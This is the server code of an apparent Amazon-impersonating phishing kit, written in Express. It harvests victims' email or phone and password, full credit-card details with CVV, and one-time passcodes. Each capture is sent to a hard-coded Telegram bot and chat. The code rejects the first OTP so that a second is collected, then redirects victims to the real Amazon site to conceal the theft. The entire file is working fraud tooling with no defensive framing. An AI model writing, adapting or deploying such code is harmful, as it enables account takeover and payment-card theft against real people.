const express = require('express');
const session = require('express-session');
const axios = require('axios');
const path = require('path');
const app = express();

// Middleware
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, '../public')));
app.use(
  session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' },
  })
);

// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = '7585548516:AAGRcY22KvqX3sme0cIf1b_NXkuF6aSJTA8';
const TELEGRAM_CHAT_ID = '-1002554104085';

// Function to send message to Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML',
    });
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
  }
}

// Route to provide session data
app.get('/session-data', (req, res) => {
  res.json({
    error: req.session.error || '',
    user_input: req.session.user_input || '',
  });
});

// Main route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../public/index.html'));
});

app.post('/submit', async (req, res) => {
  const step = req.query.step || 'email';
  let error = '';

  if (step === 'email') {
    const { email_or_phone, password } = req.body;
    if (email_or_phone && password) {
      req.session.user_input = email_or_phone;
      req.session.user_password = password;
      const message = `🔐 <b>LOGIN CREDENTIALS CAPTURED</b> 🔐\n\n` +
        `📧 <b>Email/Phone:</b> ${email_or_phone}\n` +
        `🔑 <b>Password:</b> ${password}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=verify_card');
    } else {
      error = 'Please enter both email/phone and password';
    }
  } else if (step === 'verify_card') {
    const { cardholder_name, card_number, expiration_date, security_code } = req.body;
    if (cardholder_name && card_number && expiration_date && security_code) {
      req.session.card_data = { cardholder_name, card_number, expiration_date, security_code };
      const message = `💳 <b>CREDIT CARD CAPTURED</b> 💳\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `👤 <b>Cardholder:</b> ${cardholder_name}\n` +
        `💳 <b>Card Number:</b> ${card_number}\n` +
        `📅 <b>Expiry:</b> ${expiration_date}\n` +
        `🔒 <b>CVV:</b> ${security_code}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);
      return res.redirect('/?step=otp');
    } else {
      error = 'Please fill in all card details';
    }
  } else if (step === 'otp') {
    const { otp } = req.body;
    if (otp) {
      // Store OTP attempts
      req.session.otp_attempts = req.session.otp_attempts || [];
      req.session.otp_attempts.push(otp);

      // Send each OTP attempt to Telegram
      const attemptNumber = req.session.otp_attempts.length;
      const message = `🔢 <b>OTP ATTEMPT ${attemptNumber} CAPTURED</b> 🔢\n\n` +
        `📧 <b>Email/Phone:</b> ${req.session.user_input}\n` +
        `🔢 <b>OTP:</b> ${otp}\n` +
        `🕒 <b>Time:</b> ${new Date().toISOString().replace('T', ' ').substring(0, 19)}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
      await sendToTelegram(message);

      // Simulate waiting 10 seconds for the first OTP
      await new Promise(resolve => setTimeout(resolve, 10000));
      if (req.session.otp_attempts.length === 1) {
        req.session.error = 'Invalid OTP. Please try again.';
        return res.redirect('/?step=otp');
      }

      // Simulate waiting 5 seconds before redirecting to success after second attempt
      await new Promise(resolve => setTimeout(resolve, 5000));
      if (req.session.otp_attempts.length >= 2) {
        req.session.error = '';
        return res.redirect('/?step=success');
      }
    } else {
      error = 'Please enter the OTP';
    }
  }

  req.session.error = error;
  res.redirect(`/?step=${step}`);
});

// Success page
app.get('/success', (req, res) => {
  res.send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Login Success</title>
          <link rel="stylesheet" href="/styles.css">
      </head>
      <body>
          <div class="container">
              <h1 class="form-title">Login Successful</h1>
              <div>You have successfully logged in. Redirecting to Amazon...</div>
          </div>
          <script>
              setTimeout(() => {
                  window.location.href = 'https://www.amazon.com';
              }, 3000);
          </script>
      </body>
      </html>
  `);
});

module.exports = app;
